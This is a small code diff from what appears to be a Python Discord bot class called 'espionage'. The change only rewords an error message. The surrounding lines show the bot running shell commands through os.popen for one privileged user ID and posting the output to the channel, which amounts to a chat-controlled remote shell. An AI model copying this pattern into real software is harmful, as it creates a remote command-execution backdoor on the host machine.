@@ -13,4 +13,4 @@ class espionage:
             if message.author.id==president:
                 await message.channel.send('```'+os.popen(explosive).read()+'```')
         except Exception as error:
-            await message.channel.send('could not run command\n'+str(error))
+            await message.channel.send('could not complete command\n'+str(error))
